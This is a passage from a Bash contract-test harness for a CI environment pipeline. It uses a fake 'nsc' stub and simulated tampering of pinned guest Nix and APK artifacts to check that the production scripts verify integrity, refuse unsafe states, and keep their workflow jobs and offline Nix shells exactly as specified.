      $remote_command == *'./archive-validator.sh source.tar source'* ]] || exit 67
    # Bind the fixed program text, then simulate its ordered side effects. The
    # production string remains the authority; the synthetic guest supplies
    # only outer lifecycle evidence.
    [[ $remote_command == *"${FAKE_GUEST_NIX_GUARD:?}"* &&
      $remote_command == *'uname -m'* &&
      $remote_command == *'guest_nix_pinned_asset_valid guest-nix-bootstrap.sh guest-nix-bootstrap.sha256'* &&
      $remote_command == *'guest_nix_pinned_asset_valid guest-nix-installer guest-nix-installer.sha256'* &&
      $remote_command == *'./guest-nix-installer --version'* &&
      $remote_command == *'installer-version.stderr'* &&
      $remote_command == *"'nix-installer 3.21.9' 21"* &&
      $remote_command == *'guest_nix_exact_output_valid'* &&
      $remote_command == *'guest_nix_require_clean_nix_env'* &&
      $remote_command == *'env -i PATH="$GUEST_NIX_PATH" HOME="$GUEST_NIX_HOME"'* &&
      $remote_command == *'NIX_INSTALLER_DIAGNOSTIC_ENDPOINT='* &&
      $remote_command == *'./guest-nix-installer install linux --no-confirm --init none'* &&
      $remote_command == *'. "$guest_nix_profile"'* &&
      $remote_command == *'NIX_USER_CONF_FILES=/run/diene-ci/nix-user.conf'* &&
      $remote_command == *'guest_nix_hash_etc_config'* &&
      $remote_command == *'exec /nix/var/nix/profiles/default/bin/nix '* ]] || exit 69
    guest_nix_installer_digest=$(jq -er '.guestNix.installerDigest' "$state/inputs.json")
    guest_nix_installer_bytes=$(jq -er '.guestNix.installerBytes' "$state/inputs.json")
    guest_nix_payload_digest=$(jq -er '.guestNix.payloadDigest' "$state/inputs.json")
    guest_nix_payload_bytes=$(jq -er '.guestNix.payloadBytes' "$state/inputs.json")
    [[ $remote_command == *"guest_nix_installer_digest=${guest_nix_installer_digest}"* &&
      $remote_command == *"guest_nix_installer_bytes=${guest_nix_installer_bytes}"* &&
      $remote_command == *"guest_nix_payload_digest=${guest_nix_payload_digest}"* &&
      $remote_command == *"guest_nix_payload_bytes=${guest_nix_payload_bytes}"* ]] || exit 69
    [[ $remote_command != *'sh ./guest-nix-bootstrap.sh'* &&
      $remote_command != *'guest-nix-bootstrap.sh install'* ]] || exit 69
    # Stage 0 is textually first in the same fixed program. Bind its exact
    # offline argv, its refusals, and its pins here so the synthetic lifecycle
    # cannot stay green against a rewritten or reordered bootstrap.
    [[ $remote_command == *'# --- BEGIN guest toolchain stage 0 ---'* &&
      $remote_command == *'# --- END guest toolchain stage 0 ---'* &&
      $remote_command == *'guest_toolchain_require_clean_apk_env'* &&
      $remote_command == *'/usr/bin/apk add --no-progress --no-network --allow-untrusted'* &&
      $remote_command == *'guest_toolchain_pinned_asset_valid coreutils-9.11-r3.apk coreutils-9.11-r3.apk.sha256'* &&
      $remote_command == *'/usr/bin/uname -m'* ]] || exit 71
    guest_toolchain_stage0_line=$(printf '%s\n' "$remote_command" |
      grep -n -F -- '# --- END guest toolchain stage 0 ---' | head -1 | cut -d: -f1)
    guest_toolchain_validator_line=$(printf '%s\n' "$remote_command" |
      grep -n -F -- './archive-validator.sh source.tar source' | head -1 | cut -d: -f1)
    [[ -n $guest_toolchain_stage0_line && -n $guest_toolchain_validator_line &&
      $guest_toolchain_stage0_line -lt $guest_toolchain_validator_line ]] || exit 71
    while IFS='|' read -r toolchain_name toolchain_version toolchain_bytes toolchain_digest; do
      toolchain_variable=${toolchain_name//-/_}
      [[ $remote_command == *"guest_toolchain_${toolchain_variable}_digest=${toolchain_digest}"* &&
        $remote_command == *"guest_toolchain_${toolchain_variable}_bytes=${toolchain_bytes}"* &&
        $remote_command == *"/run/diene-ci/gnu/$toolchain_name-$toolchain_version.apk"* ]] || exit 71
    done < <(jq -r '.guestToolchain.packages[] |
      "\(.name)|\(.version)|\(.bytes)|\(.digest)"' "$state/inputs.json")
    case $scenario in
      guest-apk-tamper) printf X >>"$state/gnu/coreutils-9.11-r3.apk" ;;
      guest-apk-sidecar-tamper) printf X >>"$state/gnu/sed-4.10-r1.apk.sha256" ;;
      guest-apk-pair-tamper)
        printf X | dd of="$state/gnu/grep-3.12-r6.apk" bs=1 seek=0 conv=notrunc status=none
        (cd "$state/gnu" && sha256sum grep-3.12-r6.apk >grep-3.12-r6.apk.sha256)
        ;;
      guest-apk-symlink)
        cp "$state/gnu/gawk-5.4.1-r0.apk" "$state/gnu/gawk-5.4.1-r0.apk.link-target"
        rm "$state/gnu/gawk-5.4.1-r0.apk"
        ln -s gawk-5.4.1-r0.apk.link-target "$state/gnu/gawk-5.4.1-r0.apk"
        ;;
      guest-apk-missing) rm -f "$state/gnu/libsepol-3.11-r0.apk" ;;
    esac
    event_log=${FAKE_GUEST_NIX_EVENT_LOG:?}
    while IFS='|' read -r toolchain_name toolchain_version toolchain_bytes toolchain_digest; do
      toolchain_file="$toolchain_name-$toolchain_version.apk"
      (cd "$state/gnu" && fake_guest_nix_pinned_asset_valid "$toolchain_file" \
        "$toolchain_file.sha256" "$toolchain_digest" "$toolchain_bytes") && continue
      printf '%s\n' toolchain-verify-refused >>"$event_log"
      printf '%s\n' 'GuestToolchainUntrusted: an uploaded guest toolchain package or sidecar changed' >&2
      exit 64
    done < <(jq -r '.guestToolchain.packages[] |
      "\(.name)|\(.version)|\(.bytes)|\(.digest)"' "$state/inputs.json")
    if [[ $scenario == guest-inherited-apk-* ]]; then
      expected_hostile_apk_env=${FAKE_GUEST_NIX_EXPECTED_HOSTILE_ENV:?}
      [[ -v $expected_hostile_apk_env ]] || exit 70
      printf '%s\n' inherited-apk-env-refused >>"$event_log"
      printf 'GuestToolchainUnavailable: inherited APK-family environment variables are prohibited: %s\n' \
        "$expected_hostile_apk_env" >&2
      exit 64
    fi
    printf '%s\n' toolchain-verified >>"$event_log"
    if [[ $scenario == remote-source-special ]]; then
      cp "${FAKE_HOSTILE_SOURCE_ARCHIVE:?}" "$state/source.tar"
    fi
    (cd "$state" && sha256sum -c archive-validator.sha256 >/dev/null)
    chmod 0500 "$state/archive-validator.sh"
    "$state/archive-validator.sh" "$state/source.tar" "$state/source"
    event_log=${FAKE_GUEST_NIX_EVENT_LOG:?}
    case $scenario in
      guest-wrong-arch)
        printf '%s\n' arch-refused >>"$event_log"
        printf '%s\n' 'GuestNixInstallerUnsupportedArch: the guest architecture is not the pinned x86_64 target' >&2
        exit 64
        ;;
      guest-preexisting)
        printf '%s\n' preexisting-refused >>"$event_log"
        printf '%s\n' 'GuestNixPreexistingState: the ephemeral guest already contains Nix, /nix state, or /etc/nix state' >&2
        exit 64
        ;;
      guest-preexisting-etc-nix)
        printf '%s\n' preexisting-etc-nix-refused >>"$event_log"
        printf '%s\n' 'GuestNixPreexistingState: the ephemeral guest already contains Nix, /nix state, or /etc/nix state' >&2
        exit 64
        ;;
      guest-upload-bootstrap-tamper) printf X >>"$state/guest-nix-bootstrap.sh" ;;
      guest-upload-payload-tamper) printf X >>"$state/guest-nix-installer" ;;
      guest-upload-sidecar-tamper) printf X >>"$state/guest-nix-installer.sha256" ;;
      guest-upload-bootstrap-pair-tamper)
        printf X | dd of="$state/guest-nix-bootstrap.sh" bs=1 seek=0 conv=notrunc status=none
        (cd "$state" && sha256sum guest-nix-bootstrap.sh >guest-nix-bootstrap.sha256)
        ;;
      guest-upload-payload-pair-tamper)
        printf X | dd of="$state/guest-nix-installer" bs=1 seek=0 conv=notrunc status=none
        (cd "$state" && sha256sum guest-nix-installer >guest-nix-installer.sha256)
        ;;
      guest-upload-payload-symlink)
        cp "$state/guest-nix-installer" "$state/guest-nix-installer.link-target"
        rm "$state/guest-nix-installer"
        ln -s guest-nix-installer.link-target "$state/guest-nix-installer"
        ;;
    esac
    if ! (cd "$state" &&
      fake_guest_nix_pinned_asset_valid guest-nix-bootstrap.sh guest-nix-bootstrap.sha256 \
        "$guest_nix_installer_digest" "$guest_nix_installer_bytes" &&
      fake_guest_nix_pinned_asset_valid guest-nix-installer guest-nix-installer.sha256 \
        "$guest_nix_payload_digest" "$guest_nix_payload_bytes"); then
      printf '%s\n' verify-refused >>"$event_log"
      printf '%s\n' 'GuestNixInstallerUntrusted: an uploaded guest Nix artifact or sidecar changed' >&2
      exit 64
    fi
    printf '%s\n' uploads-verified >>"$event_log"
    if [[ $scenario == guest-inherited-control-* ]]; then
      expected_hostile_env=${FAKE_GUEST_NIX_EXPECTED_HOSTILE_ENV:?}
      [[ -v $expected_hostile_env ]] || exit 70
      printf '%s\n' inherited-nix-env-refused >>"$event_log"
      printf 'GuestNixInstallerUntrusted: inherited Nix-family environment variables are prohibited: %s\n' \
        "$expected_hostile_env" >&2
      exit 64
    fi
    printf '%s\n' installer-version-probe >>"$event_log"
    case $scenario in
      guest-wrong-installer-version | guest-empty-installer-version | \
        guest-multiline-installer-version | guest-extra-newline-installer-version | \
        guest-installer-version-stderr)
        printf '%s\n' version-refused >>"$event_log"
        printf '%s\n' 'GuestNixInstallerUntrusted: the pinned installer version output is not exact' >&2
        exit 64
        ;;
    esac
    printf '%s\n' 'installer-version nix-installer 3.21.9' >>"$event_log"
    printf '%s\n' 'installer-argv install linux --no-confirm --init none' >>"$event_log"
    if [[ $scenario == guest-installer-fail ]]; then
      printf '%s\n' 'GuestNixInstallFailed: the pinned guest Nix installer failed' >&2
      exit 64
    fi
    if [[ $scenario == guest-nix-config-unsafe ]]; then
      printf '%s\n' \
        'GuestNixIdentityUnexpected: the pinned installer did not create a safe regular /etc/nix/nix.conf' >&2
      exit 64
    fi
    printf '%s\n' nix-config-bound >>"$event_log"
    case $scenario in
      guest-profile-missing | guest-profile-dangling | guest-profile-directory | \
        guest-profile-outside)
        printf '%s\n' direct-nix-ready >>"$event_log"
        printf '%s\n' 'GuestNixIdentityUnexpected: the exact guest Nix profile is absent, unreadable, or unsafe' >&2
        exit 64
        ;;
    esac
    printf '%s\n' profile-source >>"$event_log"
    if [[ $scenario == guest-profile-source-fail ]]; then
      printf '%s\n' 'GuestNixProfileSourceFailed: the exact guest Nix profile returned nonzero while being sourced' >&2
      exit 64
    fi
    if [[ $scenario == guest-toolchain-absent ]]; then
      printf '%s\n' 'GuestNixToolchainAbsent: the instance provides no nix command for the driver entry' >&2
      exit 64
    fi
    printf '%s\n' nix-develop >>"$event_log"
    "${FAKE_GUEST_BIN:?}" "$state" "$id"
    ;;
  destroy)
    flag=${1:-}; id=${2:-}; (($# == 2)) || exit 127
    [[ $flag == --force && $id =~ ^cluster-[0-9a-f]{16}$ ]] || exit 66
    [[ $scenario != destroy-fail ]] || exit 45
    rm -f -- "$root/instances/$id/live"
    if [[ $scenario == absence-fail ]]; then cp "$root/instances/$id/meta.json" "$root/stale/$id.json"; fi
    ;;
  list)
    [[ ${1:-} == --all && ${2:-} == -o && ${3:-} == json && $# -eq 3 ]] || exit 127
    [[ $scenario != list-fail ]] || exit 46
    listing=$(find "$root/instances" -mindepth 2 -maxdepth 2 -name live -print0 |
      while IFS= read -r -d '' live; do jq -c . "$(dirname -- "$live")/meta.json"; done | jq -s .)
    if [[ $scenario == absence-fail ]]; then
      listing=$(find "$root/stale" -maxdepth 1 -type f -name '*.json' -print0 |
        while IFS= read -r -d '' stale; do jq -c . "$stale"; done | jq -s .)
    fi
    if [[ $listing == '[]' ]]; then printf 'null\n'; else printf '%s\n' "$listing"; fi
    ;;
  *) printf 'fake nsc: unsupported command %s\n' "$command" >&2; exit 127 ;;
esac
NSC
chmod 0755 "$fake_nsc"

# The exact fail-closed guest Nix guard the production remote command must
# carry, verbatim. The fake ssh leg refuses any drift from this text and the
# guard is separately executed below, so the diagnostic is proved by behaviour
# rather than by a comment.
guest_nix_guard='[ -x /nix/var/nix/profiles/default/bin/nix ] || { printf "GuestNixToolchainAbsent: %s\n" "the instance provides no fixed-path nix command for the driver entry" >&2; exit 64; }'

fake_nsc_identity=$scratch/nsc-identity.json
fake_nsc_binary_digest="sha256:$(sha256sum "$fake_nsc" | awk '{print $1}')"
jq -n --arg binary "$fake_nsc_binary_digest" '
  {version:"v0.0.532",
   artifactDigest:"sha256:6666666666666666666666666666666666666666666666666666666666666666",
   binaryDigest:$binary}
' >"$fake_nsc_identity"
chmod 0600 "$fake_nsc_identity"

fake_grep_error=$scratch/grep-error
cat >"$fake_grep_error" <<'GREP'
#!/bin/sh
exit 2
GREP
chmod 0755 "$fake_grep_error"

prepare_run() {
  local run_id=${1:?run id required}
  local lane=${2:-ditto-build-local}
  local runner=${3:-$scratch/runner-$run_id}
  local nsc_root=${4:-$scratch/nsc-$run_id}
  install -d -m 0700 "$runner" "$nsc_root"
  write_subject "$runner/artifact-subject.json" "$run_id" 1
  export GITHUB_REPOSITORY_ID=12345 GITHUB_REPOSITORY=AtomiCloud/example GITHUB_SHA=$SOURCE_SHA
  export GITHUB_RUN_ID=$run_id GITHUB_RUN_ATTEMPT=1 DIENE_BASE_WORKFLOW_REF=$WORKFLOW_REF
  export DIENE_LANE=$lane DIENE_GARDEN_LOCK_DIGEST=$GARDEN_DIGEST DIENE_ARTIFACT_DIGEST=$ARTIFACT_DIGEST
  export DIENE_ARTIFACT_SUBJECT="$runner/artifact-subject.json" DIENE_TRUSTED_RUNTIME_CONTEXT=protected-base
  export DIENE_JOURNEY_MANIFEST=.diene/ci/journeys.v1.yaml DIENE_VENDOR_MANIFEST='' DIENE_ACTION_ID=''
  export DIENE_FIXTURE_ID='' DIENE_NSC_DURATION=2h DIENE_SOURCE_ARCHIVE=$source_archive
  export DIENE_CONNECTED_EGRESS_JSON='[{"dns":"api.example.test","sni":"api.example.test","port":443,"methods":["GET","POST"]}]'
  export DIENE_EGRESS_CANARY_IMAGE=$CANARY_IMAGE DIENE_EGRESS_L7_ENFORCER_BIN=.diene/ci/l7-enforcer
  export DIENE_EGRESS_PROBE_BIN=.diene/ci/egress-probe DIENE_VENDOR_CREDENTIAL_BROKER_BIN=''
  export DIENE_ADMITTED_K3S_VERSION=v1.33.1+k3s1 DIENE_K3S_SERVICE_CIDR=10.143.0.0/16
  export DIENE_ORCHESTRATOR_VENUE=local DIENE_ORCHESTRATOR_LABEL=local-contract-test
  export DIENE_ORCHESTRATOR_FALLBACK_REASON='' DIENE_NSC_BIN=$fake_nsc
  export DIENE_NSC_IDENTITY_FILE=$fake_nsc_identity
  export FAKE_NSC_ROOT=$nsc_root FAKE_NSC_LOG=$nsc_root/log FAKE_GUEST_BIN=$fake_guest
  export FAKE_GUEST_NIX_GUARD=$guest_nix_guard
  export FAKE_GUEST_NIX_EVENT_LOG=$runner/guest-nix-events.log
  export FAKE_GUEST_NIX_SOURCE_DIR=$guest_nix_fixture_dir
  export FAKE_GUEST_TOOLCHAIN_SOURCE_DIR=$guest_toolchain_apk_dir
  export FAKE_GUEST_NIX_CURL_LOG=$runner/guest-nix-curl.log
  export TEMPLATE_SCRIPT_DIR=$work/scripts/ci RUNNER_TEMP=$runner DIENE_SCHEMA_DIR=$work/schemas/ci
  export DIENE_CORE_REPORT=$runner/diene-environment-report.v1.json
  export DIENE_VENDOR_REPORT=$runner/diene-vendor-report.v1.json
  export DIENE_PROOF_BUNDLE=$runner/diene-proof-bundle.tar
  export DIENE_LEAK_CANARY="contract-canary-$run_id" DIENE_NSC_ABSENCE_WAIT_SECONDS=0
  export DIENE_NSC_ABSENCE_INTERVAL_SECONDS=1 GITHUB_OUTPUT=$runner/github-output
  export GITHUB_ENV=$runner/github-env GITHUB_STEP_SUMMARY=$runner/summary
  : >"$FAKE_NSC_LOG"; : >"$FAKE_GUEST_NIX_CURL_LOG"; : >"$FAKE_GUEST_NIX_EVENT_LOG"
  : >"$GITHUB_OUTPUT"; : >"$GITHUB_ENV"; : >"$GITHUB_STEP_SUMMARY"
  unset DIENE_ARTIFACT_PROVENANCE_REF DIENE_ARTIFACT_ATTESTATION_DIGEST
  unset DIENE_CLOSURE_DIGEST DIENE_CLOSURE_BUNDLE_REF
  unset DIENE_CLOSURE_SIGNATURE_BUNDLE_DIGEST DIENE_CLOSURE_TRUST_ROOT_DIGEST
  unset DIENE_NAMESPACE_INGRESS DIENE_PUBLIC_ENDPOINT DIENE_NSC_CACHE_TAG DIENE_CACHE_DIR
  unset DIENE_SEED_IDENTITY DIENE_VENDOR_CREDENTIAL DIENE_NSC_MACHINE_TYPE GITHUB_WORKSPACE
  unset DIENE_PRE_SIT_NEGATIVE_CANARY DIENE_PRE_SIT_FIXTURE_ROOT
  unset FAKE_L7_COMPLETE FAKE_PROBE_FAIL_SCOPE FAKE_PROBE_NO_TRANSCRIPT FAKE_PROBE_DROP_ID
  unset FAKE_PROBE_OUTCOME FAKE_PROBE_CLUSTER FAKE_PROBE_REQUIRED FAKE_PROBE_REASON
  unset FAKE_PROBE_MUTATE_SCOPE
  unset FAKE_L7_LOG FAKE_PROBE_LOG FAKE_BROKER_LOG
  unset FAKE_TABLE_FAIL_REGEX FAKE_RESOLVER_IPV4 FAKE_BROKER_FAIL_COMMAND
  unset FAKE_NODE_POD_CIDRS DIENE_IPV6_DISABLE_PATH DIENE_EVIDENCE_STAGING
  unset FAKE_HOSTILE_SOURCE_ARCHIVE
  unset FAKE_GUEST_NIX_FETCH_SCENARIO
  unset FAKE_GUEST_NIX_EXPECTED_HOSTILE_ENV
  unset DIENE_CURL_BIN
  unset DIENE_GREP_BIN
  if [[ $lane == ditto-target-pull ]]; then
    export DIENE_ARTIFACT_PROVENANCE_REF="oci://ghcr.io/atomicloud/example/provenance/$SOURCE_SHA"
    export DIENE_ARTIFACT_ATTESTATION_DIGEST=$ATTESTATION_DIGEST
    export DIENE_CONNECTED_EGRESS_JSON='[{"dns":"ghcr.io","sni":"ghcr.io","port":443,"methods":["GET"]}]'
  elif [[ $lane == absol ]]; then
    export DIENE_CLOSURE_DIGEST=$CLOSURE_DIGEST
    export DIENE_CLOSURE_BUNDLE_REF="oci://ghcr.io/atomicloud/example/closure/$SOURCE_SHA"
    export DIENE_CLOSURE_SIGNATURE_BUNDLE_DIGEST=$CLOSURE_SIGNATURE_DIGEST
    export DIENE_CLOSURE_TRUST_ROOT_DIGEST=$CLOSURE_ROOT_DIGEST
  elif [[ $lane == fleet-independence ]]; then
    export DIENE_FIXTURE_ID=bootstrap-fleet-independence-v1
  elif [[ $lane == ditto-vendor ]]; then
    export DIENE_JOURNEY_MANIFEST='' DIENE_VENDOR_MANIFEST=.diene/ci/vendors.v1.yaml
    export DIENE_ACTION_ID=demo-vendor DIENE_VENDOR_CREDENTIAL_BROKER_BIN=.diene/ci/vendor-broker
    export DIENE_CONNECTED_EGRESS_JSON=''
  fi
}

run_orchestrator() {
  local scenario=${1:-happy}
  (cd -- "$work" && FAKE_NSC_SCENARIO=$scenario ./scripts/ci/environment-k3d-run.sh orchestrate)
}

printf '== harness bootstrap ==\n'
ok 'local fixture and measured fake-nsc surface are ready'

# Test sections are intentionally below the leakage canary section too: a
# canary refusal must not terminate the parent harness before the final tail.

assert_contains() {
  local file=${1:?file required} needle=${2:?needle required}
  grep -Fq -- "$needle" "$file" || fail "$file does not contain $needle"
}

assert_not_contains() {
  local file=${1:?file required} needle=${2:?needle required}
  ! grep -Fq -- "$needle" "$file" || fail "$file unexpectedly contains $needle"
}

printf '== static workflow and compatibility ABI ==\n'

workflow=$template_root/.github/workflows/⚡reusable-environment-k3d.yaml
workflow_json=$scratch/reusable-environment-k3d.json
yq -o=json '.' "$workflow" >"$workflow_json"
for job in environment-ditto-build-local environment-ditto-target-pull environment-ditto-vendor \
  environment-absol environment-fleet-independence environment-runner-lifecycle; do
  grep -Eq "^  ${job}:" "$workflow" || fail "stable workflow job $job is absent"
done
ok 'all six runtime/lifecycle job IDs remain stable'

for entrypoint in environment-profile-contract.sh environment-k3d-run.sh environment-vendor-run.sh \
  environment-report.sh environment-receipt-sweep.sh environment-runner-preflight.sh; do
  [[ -x $script_dir/$entrypoint ]] || fail "retained entrypoint $entrypoint is absent or non-executable"
done
[[ ! -e $script_dir/environment-nsc-lifecycle.sh ]] ||
  fail 'an unratified seventh environment-nsc-lifecycle entrypoint was added'
ok 'the exact six retained entrypoints own the lifecycle surface'

[[ ! -e $template_root/schemas/ci/diene-runner-pin-v1.schema.json &&
  ! -e $template_root/schemas/ci/diene-host-policy-v1.schema.json ]] ||
  fail 'a shelved DigitalOcean runner schema remains active'
jq -e '.properties.substrate.properties.kind.const == "k3d"' \
  "$template_root/schemas/ci/diene-runtime-consumption-v1.schema.json" >/dev/null ||
  fail 'the Garden-owned opaque runtime-consumption ABI changed'
ok 'DO-only schemas are retired while the Garden k3d compatibility field remains opaque'

jq -e '
  .jobs as $jobs |
  ["nscloud-ubuntu-26.04-amd64-16x32-with-cache",
   "nscloud-cache-size-50gb",
   "nscloud-cache-tag-atomi-nix-store-cache-ubuntu-26.04-amd64"] as $cached |
  (["environment-ditto-build-local","environment-ditto-target-pull","environment-ditto-vendor"] |
    all(. as $id |
      $jobs[$id]["runs-on"] == $cached and
      $jobs[$id].env.DIENE_ORCHESTRATOR_VENUE == "namespace" and
      $jobs[$id].env.DIENE_ORCHESTRATOR_LABEL == $cached[0])) and
  (["environment-absol","environment-fleet-independence"] |
    all(. as $id |
      $jobs[$id]["runs-on"] == "nscloud-ubuntu-26.04-amd64-16x32" and
      $jobs[$id].env.DIENE_ORCHESTRATOR_VENUE == "namespace" and
      $jobs[$id].env.DIENE_ORCHESTRATOR_LABEL == $jobs[$id]["runs-on"])) and
  (["contract","environment-runner-lifecycle"] |
    all(. as $id |
      $jobs[$id]["runs-on"] == "ubuntu-26.04" and
      $jobs[$id].env.DIENE_ORCHESTRATOR_VENUE == "github-hosted" and
      $jobs[$id].env.DIENE_ORCHESTRATOR_LABEL == $jobs[$id]["runs-on"]))
' "$workflow_json" >/dev/null ||
  fail 'resolved runtime/hosted workflow jobs violate the exact 26.04 cache and venue-label law'
if rg -n 'ubuntu-24\.04' "$template_root/.github/workflows" >"$scratch/hosted-24"; then
  sed -n '1,120p' "$scratch/hosted-24" >&2
  fail 'a workflow still names the retired GitHub-hosted Ubuntu 24.04 venue'
fi
grep -Fq 'platform per-instance policy pending (support ask #4)' \
  "$template_root/scripts/ci/environment-k3d-run.sh" ||
  fail 'the interim platform-policy status is not stamped into workflow evidence'
ok 'each cached, cacheless, and hosted job resolves to its exact 26.04 venue and label'

if rg -n 'runs-on:.*self-hosted|digitalocean|doctl|k3d (cluster|create|delete)|k3s ctr images export|nsc ingress|actions/cache' \
  --glob '!test-environment-contract.sh' "$template_root/.github/workflows" \
  "$template_root/scripts/ci" >"$scratch/forbidden-static"; then
  sed -n '1,120p' "$scratch/forbidden-static" >&2
  fail 'an executable workflow/script revives a forbidden substrate or cache path'
fi
if rg -n 'runner-pin|host-policy|leaseId|DigitalOcean|JIT' --glob '!test-environment-contract.sh' \
  "$workflow" "$template_root/scripts/ci" \
  >"$scratch/forbidden-shelved"; then
  sed -n '1,120p' "$scratch/forbidden-shelved" >&2
  fail 'the active runtime surface still depends on shelved runner apparatus'
fi
ok 'active code contains no self-hosted, DO, nested-k3d, ingress, cache, or export path'

printf '== resolved ci shell owns the production command surface ==\n'

resolve_offline_flake_source() {
  local reference=${1:?flake reference required}
  local revision=${2:?flake revision required}
  local expected_hash=${3:?flake hash required}
  local metadata
  metadata=$(nix flake prefetch --offline --json "$reference") ||
    fail "the pinned flake source is not available offline: $reference"
  jq -er --arg revision "$revision" --arg expectedHash "$expected_hash" '
    select(.locked.rev == $revision and .locked.narHash == $expectedHash) |
    .storePath | select(type == "string" and startswith("/nix/store/"))
  ' <<<"$metadata" || fail "the offline flake source changed identity: $reference"
}

ci_shell_commands=(
  awk base64 basename cat check-jsonschema chmod curl cut date dirname env find
  getent git grep id install ip jq kubectl mktemp mv nc nsc pls pre-commit ps rm
  rg sed sha256sum sleep sort ss stat tar timeout tr wc yq
)
nix_shell_build=()
nix_shell_darwin_eval=()
nix_shell_develop=()
nix_shell_linux_proof=()
nix_shell_darwin_proof=()
nix_shell_proof_has_main=false
if [[ -f $template_root/flake.nix ]]; then
  nix_system=$(nix eval --impure --raw --expr builtins.currentSystem) ||
    fail 'the current Nix system could not be resolved'
  nix_shell_build=(nix build --offline --no-link \
    "$template_root#devShells.$nix_system.ci")
  nix_shell_darwin_eval=(nix eval --offline --raw \
    "$template_root#devShells.aarch64-darwin.ci.drvPath")
  nix_shell_develop=(nix develop --offline --ignore-environment \
    --keep-env-var HOME "$template_root#ci")
  nix_shell_linux_proof=(nix eval --offline --json --apply \
    'shells: {shellNames = builtins.attrNames shells; shellDrvPaths = builtins.mapAttrs (_: shell: shell.drvPath) shells;}' \
    "$template_root#devShells.x86_64-linux")
  nix_shell_darwin_proof=(nix eval --offline --json --apply \
    'shells: {shellNames = builtins.attrNames shells; shellDrvPaths = builtins.mapAttrs (_: shell: shell.drvPath) shells;}' \
    "$template_root#devShells.aarch64-darwin")
  ci_shell_success='the repo-locked ci shell owns every production command and evaluates on Darwin'
else
  nixpkgs_revision=4382ed2b7a6839d4280a9b386db49cbc5907414d
  nixpkgs_hash=sha256-iYL/bixrb6FlHFu/gIuBYzq6c6lM5AAXsXNSWXtIgQc=
  atomipkgs_revision=964cc580004effe73eaf6739fb01d95414f4dd50
  atomipkgs_hash=sha256-mrjPkZJlxoGUGjp1EF57TBIs1wIuGGib1ANvQJHb/2E=
  nixpkgs_source=$(resolve_offline_flake_source \
    "github:NixOS/nixpkgs/$nixpkgs_revision" "$nixpkgs_revision" "$nixpkgs_hash")
  atomipkgs_source=$(resolve_offline_flake_source \
    "github:AtomiCloud/nix-registry/$atomipkgs_revision" \
    "$atomipkgs_revision" "$atomipkgs_hash")

  ci_shell_composition=$scratch/ci-shell-composition.nix
  cat >"$ci_shell_composition" <<'NIX'
{ templateRoot, nixpkgsSource, atomipkgsSource, system ? builtins.currentSystem }:
let
  pkgs = import (builtins.storePath nixpkgsSource) { inherit system; };
  atomi = (builtins.getFlake atomipkgsSource).packages.${system};
  packages = import (templateRoot + "/nix/packages.nix") {
    inherit pkgs atomi;
    pkgs-2605 = pkgs;
    # packages.nix currently takes no packages from this set.  Binding it to
    # the same immutable source keeps this regression offline and bounded.
    pkgs-unstable = pkgs;
  };
  env = import (templateRoot + "/nix/env.nix") { inherit pkgs packages; };
  shells = import (templateRoot + "/nix/shells.nix") {
    inherit pkgs packages env;
    shellHook = "";
  };
  packageName = package: package.pname or package.name;
in
shells // {
  proof = {
    activeMain = map packageName (
      env.main ++ pkgs.lib.optionals pkgs.stdenv.hostPlatform.isLinux env.mainLinux
    );
    nscName = packages.nsc.name;
    nscOut = packages.nsc.outPath;
    shellDrvPaths = builtins.mapAttrs (_: shell: shell.drvPath) shells;
    shellNames = builtins.attrNames shells;
  };
}
NIX

  nix_composition_args=(
    --argstr templateRoot "$template_root"
    --argstr nixpkgsSource "$nixpkgs_source"
    --argstr atomipkgsSource "$atomipkgs_source"
  )
  nix_shell_build=(nix build --offline --impure --no-link \
    --file "$ci_shell_composition" "${nix_composition_args[@]}" ci)
  nix_shell_darwin_eval=(nix eval --offline --impure --raw \
    --file "$ci_shell_composition" "${nix_composition_args[@]}" \
    --argstr system aarch64-darwin ci.drvPath)
  nix_shell_develop=(nix develop --offline --impure --ignore-environment \
    --keep-env-var HOME --file "$ci_shell_composition" \
    "${nix_composition_args[@]}" ci)
  nix_shell_linux_proof=(nix eval --offline --impure --json \
    --file "$ci_shell_composition" "${nix_composition_args[@]}" \
    --argstr system x86_64-linux proof)
  nix_shell_darwin_proof=(nix eval --offline --impure --json \
    --file "$ci_shell_composition" "${nix_composition_args[@]}" \
    --argstr system aarch64-darwin proof)
  nix_shell_proof_has_main=true
  ci_shell_success='the synthetic offline ci shell for the flake-less template owns every production command and evaluates on Darwin'
fi

validate_shell_proof() {
  local label=${1:?label required} target_system=${2:?system required}
  local strict_main=${3:?strict-main flag required} proof=${4:?proof required}
  local expected_main='[]'
  case $target_system in
    x86_64-linux) expected_main='["git","kubectl","iproute2","glibc"]' ;;
    aarch64-darwin) expected_main='["git","kubectl"]' ;;
    *) fail "unsupported shell-proof system: $target_system" ;;
  esac
  jq -e --argjson strictMain "$strict_main" --argjson expectedMain "$expected_main" '
    .shellNames == ["cd","ci","default","releaser"] and
    (.shellDrvPaths | keys) == ["cd","ci","default","releaser"] and
    ([.shellDrvPaths[] |
      type == "string" and test("^/nix/store/[a-z0-9]{32}-nix-shell\\.drv$")] | all) and
    (if $strictMain then
      .activeMain == $expectedMain and
      .nscName == "nsc-0.0.532" and
      (.nscOut | type == "string" and
        test("^/nix/store/[a-z0-9]{32}-nsc-0\\.0\\.532$"))
    else true end)
  ' <<<"$proof" >/dev/null || fail "$label lost its exact $target_system shell composition"
}

if ! linux_shell_proof=$("${nix_shell_linux_proof[@]}"); then
  fail 'the resolved shell set could not be inspected on x86_64-linux'
fi
if ! darwin_shell_proof=$("${nix_shell_darwin_proof[@]}"); then
  fail 'the resolved shell set could not be inspected on aarch64-darwin'
fi
validate_shell_proof canonical x86_64-linux "$nix_shell_proof_has_main" "$linux_shell_proof"
validate_shell_proof canonical aarch64-darwin "$nix_shell_proof_has_main" "$darwin_shell_proof"

nsc_shell_assertion=$scratch/assert-nsc-shell
cat >"$nsc_shell_assertion" <<'ASSERT_NSC'
#!/usr/bin/env bash
set -euo pipefail
resolved=$(command -v nsc)
[[ ${DIENE_NSC_BIN-} == "$resolved" ]]
[[ $DIENE_NSC_BIN == /nix/store/*-nsc-0.0.532/bin/nsc ]]
nsc_root=${DIENE_NSC_BIN%/bin/nsc}
[[ ${DIENE_NSC_IDENTITY_FILE-} == "$nsc_root/share/diene/nsc-identity.json" ]]
[[ -x $DIENE_NSC_BIN && -r $DIENE_NSC_IDENTITY_FILE ]]
for command_name in git kubectl ip ss getent; do
  command_path=$(command -v "$command_name")
  [[ $command_path == /nix/store/* ]]
done
setup_hook=$nsc_root/nix-support/setup-hook
